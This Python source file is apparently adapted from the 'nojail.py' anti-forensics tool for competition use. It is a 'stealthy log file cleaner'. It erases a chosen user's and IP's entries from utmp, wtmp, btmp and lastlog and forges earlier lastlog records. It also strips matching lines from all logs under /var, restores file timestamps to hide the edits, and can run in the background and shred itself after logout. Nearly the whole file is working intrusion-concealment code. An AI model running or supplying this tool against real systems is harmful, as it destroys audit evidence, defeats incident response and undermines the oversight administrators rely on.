#!/usr/bin/env python


# This script is a modified version of github.com/JusticeRage/freedomfighting/blob/master/nojail.py
# This was modified for use in competition, original author and credit to github.com/JusticeRage

import optparse
import os
import platform
import pwd
import random
import struct
import subprocess
import sys
import argparse
import datetime
import glob
import gzip
import re
import time


def ask_confirmation(message):
    answers = {"y": True, "yes": True, "n": False, "no": False}
    while True:
        response = input("[ ] {}\n".format(message) + orange("Confirm? [Y/n] ")).lower()
        if response in answers:
            return answers[response]
        elif not response:  # Default to yes.
            return True


VERBOSE = False
CHECK_MODE = False
LAST_LOGIN = {"timestamp": 0, "terminal": "", "hostname": ""}
LINUX_UTMP_FILES = ["/var/run/utmp", "/var/log/wtmp", "/var/log/btmp"]
LINUX_LASTLOG_FILE = "/var/log/lastlog"
LINUX_ADDITIONAL_LOGS = ["/var/log/messages", "/var/log/secure"]
UTMP_BLOCK_SIZE = 384
LASTLOG_BLOCK_SIZE = 292
UTMP_UNPACK_STRING = "hi32s4s32s256s2h3i36x"
LASTLOG_UNPACK_STRING = "i32s256s"
SAFE_MOUNTPOINT = None

GREEN = '\033[92m'
ORANGE = '\033[93m'
RED = '\033[91m'
END = '\033[0m'


def red(text): return RED + text + END


def orange(text): return ORANGE + text + END


def green(text): return GREEN + text + END


def error(text): return "[" + red("!") + "] " + red("Error: " + text)


def warning(text): return "[" + orange("*") + "] Warning: " + text


def success(text): return "[" + green("*") + "] " + green(text)


def info(text): return "[ ] " + text


def random_string(size):
    return ''.join(random.choice("abcdefghijlkmnopqrstuvwxyz0123456789") for _ in range(size))


def print_if_verbose(text):
    if VERBOSE:
        print(text)


def get_safe_mountpoint():
    global SAFE_MOUNTPOINT
    if SAFE_MOUNTPOINT is not None:
        return SAFE_MOUNTPOINT

    p = subprocess.Popen(["mount", "-t", "tmpfs"], stdout=subprocess.PIPE)
    candidates, stderr = p.communicate()
    candidates = candidates.decode()
    candidates = filter(lambda x: "rw" in x, candidates.split('\n'))
    for c in candidates:
        # Assert that the output of mount is sane
        device = c.split(" ")[2]
        print(device[0])
        if device[0] != '/':
            print(error("{} doesn't seem to be a mountpoint...".format(device)))
            continue

        # Check that we have sufficient rights to create files there.
        if not os.access(device, os.W_OK):
            if VERBOSE:
                print(info("Unable to work in {}...".format(device)))
            continue

        # Verify that there is some space left on the device:
        statvfs = os.statvfs(device)
        if statvfs.f_bfree < 1000:  # Require at least 1000 free blocks
            if VERBOSE:
                print(info("Rejecting {} because there isn't enough space left...".format(device)))
            continue

        # OK, suitable place identified.
        SAFE_MOUNTPOINT = device
        break

    if SAFE_MOUNTPOINT is not None:
        if VERBOSE:
            print(success("Identified {} as a suitable working directory.".format(SAFE_MOUNTPOINT)))
        return SAFE_MOUNTPOINT
    print(error("Could not find a tmpfs mountpoint to work in! Aborting."))
    sys.exit(-1)


def get_temp_filename():
    return os.path.join(get_safe_mountpoint(), random_string(10))


def proper_overwrite(source, destination):
    if not os.path.exists(source) or not os.path.exists(destination):
        print(error("Either {} or {} does not exist! Logs have NOT been "
                    "overwritten!".format(source, destination)))
        return False
    if not os.access(destination, os.W_OK):
        print(error("Cannot write to {}! Logs have NOT been overwritten!".format(destination)))
        return False

    stat = os.stat(destination)
    ret = os.system("cat {} > {}".format(source, destination))
    if ret != 0:
        if VERBOSE:
            print(warning("Command \"cat {} > {}\" failed!".format(source, destination)))
        return False
    os.utime(destination, (stat.st_atime, stat.st_mtime))
    return True


def secure_delete(target):
    if not os.path.exists(target):  # Easiest deletion ever.
        print(error("Tried to delete a nonexistent file! ({})".format(target)))
        return

    try:
        subprocess.call(["shred", "-uz", target])
    except OSError:  # Shred is not present on the machine.
        if VERBOSE:
            print(warning("shred is not available. Falling back to manual "
                          "secure file deletion."))
        f = None
        try:
            f = open(target, "ab+")
            length = f.tell()
            for _ in range(0, 3):
                f.seek(0)
                f.write(os.urandom(length))
        finally:
            if f is not None:
                f.close()
        os.remove(target)


def backup_log_file(filepath):
    """Create a backup of the log file before modification."""
    if not os.path.exists(filepath):
        print_if_verbose(f"Warning: File {filepath} does not exist. Skipping backup.")
        return None
    backup_path = filepath + ".bak"
    try:
        with open(filepath, 'rb') as f_in:
            with open(backup_path, 'wb') as f_out:
                f_out.write(f_in.read())
        print_if_verbose(f"Backup created at {backup_path}.")
        return backup_path
    except Exception as e:
        print_if_verbose(f"Failed to create backup for {filepath}: {str(e)}")
        return None


def check_file_integrity(filepath):
    """Verify the integrity of the log file."""
    try:
        with open(filepath, 'rb') as f:
            original_size = os.path.getsize(filepath)
            current_size = len(f.read())
            if original_size != current_size:
                print_if_verbose(f"Warning: File integrity compromised for {filepath}.")
                return False
    except Exception as e:
        print_if_verbose(f"Error: {e}")
        return False
    return True


def clean_utmp(filename, username, ip):
    cleaned_entries = 0
    clean_file = b""
    global LAST_LOGIN, CHECK_MODE
    if not os.path.exists(filename):
        print(warning("{} does not exist.".format(filename)))
        return  # Nothing to do

    f = None
    try:
        f = open(filename, 'rb')
        while True:
            block = f.read(UTMP_BLOCK_SIZE)
            if not block:
                break
            # Assert that the last 20 bytes are 0s (the "__unused" field)
            if block[-20:] != "\x00" * 20:
                print(error("This distribution may not be using the expected UTMP block size. "
                            "{} will NOT be cleaned!".format(filename)))
                if f is not None:
                    f.close()
                return
            utmp_struct = struct.unpack(UTMP_UNPACK_STRING, block)
            # Only drop blocks which match both the user and the IP address.
            if utmp_struct[5].strip("\x00") in [ip]:
                if (not CHECK_MODE) or (CHECK_MODE and ask_confirmation("About to delete a record in %s for a %s "
                                                                        "login from %s on %s." % (filename,
                                                                                                  utmp_struct[4].strip(
                                                                                                      "\x00"),
                                                                                                  utmp_struct[5].strip(
                                                                                                      "\x00"),
                                                                                                  datetime.datetime.fromtimestamp(
                                                                                                      int(utmp_struct[
                                                                                                              9])).strftime(
                                                                                                      '%Y-%m-%d %H:%M:%S')))):
                    cleaned_entries += 1
                else:  # The user doesn't want to delete the block.
                    clean_file += block
            else:
                # Do not take failed logins into account when restoring the previous successful connexion.
                if filename != LINUX_UTMP_FILES[-1] and utmp_struct[4].strip("\x00") == username and utmp_struct[9] > \
                        LAST_LOGIN["timestamp"]:
                    # This is a previous connexion by the "real" user and it's the most recent we've seen.
                    LAST_LOGIN = {"terminal": utmp_struct[2],
                                  "timestamp": utmp_struct[9],
                                  "hostname": utmp_struct[5]}
                clean_file += block

        if cleaned_entries == 0:  # Nothing to remove from the file. Error in the args?
            print(info("No entries to remove from {}.".format(filename)))
        else:
            # Replace the old contents with the filtered one.
            tmp_file = get_temp_filename()
            g = None
            try:
                g = open(tmp_file, "wb")
                g.write(clean_file)
            finally:
                if g is not None:
                    g.close()
            if proper_overwrite(tmp_file, filename):
                print(success("{} entries removed from {}!".format(cleaned_entries, filename)))
            secure_delete(tmp_file)
        if f is not None:
            f.close()

    except IOError:
        print(error("Unable to read or write to {}. Logfile will NOT be cleaned.".format(filename)))
        if f is not None:
            f.close()


def clean_lastlog(filename, username, ip):
    if not os.path.exists(filename):
        print(warning("{} does not exist.".format(filename)))
        return  # Nothing to do

    clean_file = b""
    f = None
    try:
        f = open(filename, 'rb')
        # Go to the block corresponding to the user's UID.
        uid = pwd.getpwnam(username).pw_uid
        if uid != 0:
            clean_file += f.read(uid * LASTLOG_BLOCK_SIZE)

        block = f.read(LASTLOG_BLOCK_SIZE)
        lastlog_struct = struct.unpack(LASTLOG_UNPACK_STRING, block)
        if lastlog_struct[2].strip("\x00") not in [ip]:
            return  # Nothing to do: the last log isn't from the current IP.

        if CHECK_MODE and not ask_confirmation("About to modify the following %s record: latest login from %s (%s): %s."
                                               % (filename, username, lastlog_struct[2].strip("\x00"),
                                                  datetime.datetime.fromtimestamp(int(lastlog_struct[0])).strftime('%Y-%m-%d %H:%M:%S'))):
            return

        if LAST_LOGIN["timestamp"] == 0:  # No previous login information. Append an empty block.
            clean_file += "\x00" * LASTLOG_BLOCK_SIZE
        else:
            clean_file += struct.pack(LASTLOG_UNPACK_STRING, LAST_LOGIN["timestamp"],
                                      LAST_LOGIN["terminal"],
                                      LAST_LOGIN["hostname"])

        # Append the rest of the file and overwrite lastlog:
        clean_file += f.read()
        tmp_file = get_temp_filename()
        g = None
        try:
            g = open(tmp_file, "wb")
            g.write(clean_file)
        finally:
            if g is not None:
                g.close()
        success_flag = proper_overwrite(tmp_file, filename)
        secure_delete(tmp_file)

        if not success_flag:
            return  # Return immediately without printing a success message.

        if LAST_LOGIN["timestamp"] != 0:
            timestamp_str = datetime.datetime.fromtimestamp(int(LAST_LOGIN["timestamp"])).strftime('%Y-%m-%d %H:%M:%S')
            print(success("Lastlog set to %s from %s at %s" % (timestamp_str,
                                                               LAST_LOGIN["terminal"],
                                                               LAST_LOGIN["hostname"])))
        else:
            print(success("Removed {}'s login information from lastlog!".format(username)))
    finally:
        if f is not None:
            f.close()


def clean_generic_logs(files, ip, regexp):
    devnull = None
    try:
        devnull = open(os.devnull, 'w')
        p = subprocess.Popen(
            ["find", "/var", "-regextype", "posix-egrep",
             "-regex", r".*(\.|/sys)log(\.[0-9]+)?(\.gz)?$", "-type", "f", ],
            stdout=subprocess.PIPE, stderr=devnull
        )
        var_logs, stderr = p.communicate()
    finally:
        if devnull is not None:
            devnull.close()

    additional_files = None
    if platform.system() == "Linux":
        additional_files = LINUX_ADDITIONAL_LOGS

    var_logs = var_logs.decode()
    targets = set(list(filter(lambda x: x.strip(), var_logs.split('\n'))) + additional_files)
    # Process the list of files given by the user.
    for f in files:
        if not os.path.isdir(f):
            targets.add(f)
        else:
            targets.update([x for x in glob.glob(os.path.join(f, "*")) if not os.path.isdir(x)])

    for log in targets:
        if not os.path.exists(log):
            continue
        if not os.access(log, os.R_OK | os.W_OK):
            if VERBOSE:
                print(warning("Unable to read or write to {}! Skipping...".format(log)))
            continue

        cleaned_entries = 0
        tmp_file = get_temp_filename()
        f, g = (None, None)
        try:
            if not log.endswith(".gz"):
                g = open(tmp_file, "wb")
            else:
                g = gzip.open(tmp_file, "wb")
            if not log.endswith(".gz"):
                f = open(log, 'r')
            else:
                f = gzip.open(log, "rb")
            while True:
                line = f.readline()
                if not line:
                    break
                if isinstance(line, bytes):
                    line = line.decode('utf-8')
                if ip in line or (regexp and re.search(regexp, line)):
                    if CHECK_MODE and not ask_confirmation(red("About to delete the "
                                                               "following line from {}:\n".format(log)) +
                                                           "{}.".format(line.rstrip("\n"))):
                        g.write(line)
                    else:
                        cleaned_entries += 1  # Exclude this line.
                else:
                    g.write(bytes(line, encoding='utf-8'))  # IP or hostname is not present. Write the line.
        finally:
            if f is not None:
                f.close()
            if g is not None:
                g.close()

        if cleaned_entries == 0:
            if VERBOSE or log in files:
                print(info("No entries to remove found in {}.".format(log)))
            secure_delete(tmp_file)
            continue
        else:
            if proper_overwrite(tmp_file, log):
                print(success("%d lines removed from %s!" % (cleaned_entries, log)))
            secure_delete(tmp_file)


def daemonize():
    sys.stdout.flush()

    def fork():
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            _, e = sys.exc_info()[:2]
            print("Forking Error! ({})".format(e.message))
            sys.exit(1)

    fork()
    os.chdir('/')
    os.setsid()
    os.umask(0)
    fork()

    print(success("The script has daemonized successfully."))
    sys.stdout.flush()

    # Dirty trick to figure out when the user has disconnected from the current session:
    # try to use the file descriptor for stdout and detect when it is closed. If it doesn't
    # work because no TTY is present in the first place, just sleep for a minute so the user
    # has time to log out.
    while True:
        time.sleep(10)
        try:
            os.ttyname(1)
        except OSError:  # Exception caught: stdout doesn't exist anymore.
            time.sleep(50)
            return  # This means the session has ended and we can proceed.


def validate_args(args):
    global VERBOSE, CHECK_MODE
    VERBOSE = args.verbose

    # Get the username from the environment if none is given.
    if args.user is None:
        if "USER" in os.environ:
            args.user = os.environ["USER"]
        else:
            print(error("Could not determine the username. Please specify it with the -u option."))
            sys.exit(1)

    # Get the IP from the environment if none is given.
    if args.ip is None:
        if "SSH_CONNECTION" in os.environ:
            args.ip = os.environ['SSH_CONNECTION'].split(' ')[0]
        else:
            print(error("Could not determine the IP address. Please specify it with the -i option."))
            sys.exit(1)

    # Compile the regular expression for efficiency reasons
    if args.regexp:
        try:
            args.regexp = re.compile(args.regexp)
        except:
            print(error("The regular expression specified is invalid."))
            sys.exit(1)

    # Enable the --check option if requested.
    if args.check:
        if not sys.stdin.isatty():
            print(error("Cannot ask for confirmation without a TTY. Please rerun without --check."))
            sys.exit(1)
        if args.daemonize:
            print(error("The --check option is incompatible with --daemonize."))
            sys.exit(1)
        CHECK_MODE = True

    # Assert that the given log files can be read and written to, otherwise they can't be tampered with.
    if args.log_files is not None:
        for log in args.log_files:
            if not os.path.exists(log):
                print(error("{} does not exist!".format(log)))
                sys.exit(1)
            if not os.access(log, os.R_OK | os.W_OK):
                print("{} is not readable and/or not writable!".format(log))
                sys.exit(1)

    if args.daemonize:
        if not sys.stdin.isatty():
            print(warning("Cannot detect session termination without a TTY! The script will automatically "
                          "start in 60 seconds. Make sure you log out before then, or run the script again later."))
        daemonize()


if __name__ == "__main__":
    if argparse:
        parser = argparse.ArgumentParser(description="Stealthy log file cleaner.")
        parser.add_argument("--user", "-u", help="The username to remove from the connexion logs.")
        parser.add_argument("--ip", "-i", help="The IP address to remove from the logs.")
        parser.add_argument("--regexp", "-r", help="A regular expression to select log "
                                                   "lines to delete (optional)", default=None)
        parser.add_argument("--verbose", "-v", help="Print debug messages.", action="store_true")
        parser.add_argument("--check", "-c", help="If present, the user will be asked to confirm "
                                                  "each deletion from the "
                                                  "logs.", action="store_true")
        parser.add_argument("--daemonize", "-d", help="Start in the background and delete logs when "
                                                      "the current session "
                                                      "terminates. This script will then delete "
                                                      "itself.", action="store_true")
        parser.add_argument("log_files", nargs='*', help="Specify any log files to clean in addition to /var/**/*.log.")
        args = parser.parse_args()
    else:  # argparse is unavailable. Fall back to optparse.
        parser = optparse.OptionParser(description="Stealthy log file cleaner.")
        parser.add_option("-u", "--user", help="The username to remove from the connexion logs.")
        parser.add_option("-i", "--ip", help="The IP address to remove from the logs.")
        parser.add_option("-v", "--verbose", help="Print debug messages.", action="store_true")
        parser.add_option("-c", "--check", help="If present, the user will be asked to confirm each deletion from the "
                                                "logs.", action="store_true")
        parser.add_option("-d", "--daemonize", help="Start in the background and delete logs when the current session "
                                                    "terminates. This script will then delete "
                                                    "itself.", action="store_true")
        (args, positional) = parser.parse_args()
        args.log_files = positional

    validate_args(args)
    print(info("Cleaning logs for {} ({}).".format(args.user, args.ip, )))

    system = platform.system()
    if system == "Windows":
        print("Windows isn't supported by this script!")
        sys.exit(1)

    get_safe_mountpoint()

    if system == "Linux":
        for log in LINUX_UTMP_FILES:
            clean_utmp(log, args.user, args.ip)
        clean_lastlog(LINUX_LASTLOG_FILE, args.user, args.ip)
    else:
        print(error("UTMP/WTMP/lastlog cannot be cleaned on {} :(".format(system)))

    clean_generic_logs(args.log_files, args.ip, args.regexp)

    if args.daemonize and os.path.exists(sys.argv[0]):
        secure_delete(sys.argv[0])

    elif args.daemonize and os.path.exists(os.path.join(".", sys.argv[0])):
        secure_delete(os.path.join(".", sys.argv[0]))
